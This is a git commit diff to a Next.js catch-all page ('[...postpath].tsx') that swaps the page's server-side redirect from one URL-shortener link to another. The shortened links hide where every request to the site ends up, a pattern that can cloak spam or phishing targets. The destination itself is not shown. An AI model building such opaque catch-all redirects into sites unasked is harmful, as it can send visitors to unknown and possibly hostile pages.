18d3913286c4e4a5cdc6526a99f8baada4ad339f
gunjack7 <131535818+gunjack7@users.noreply.github.com>
2023-12-22 21:56:40 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://urlzs.com/tLN7k`
+					`https://shorturl.at/akvzU`
 				}`,
 			},
 		};
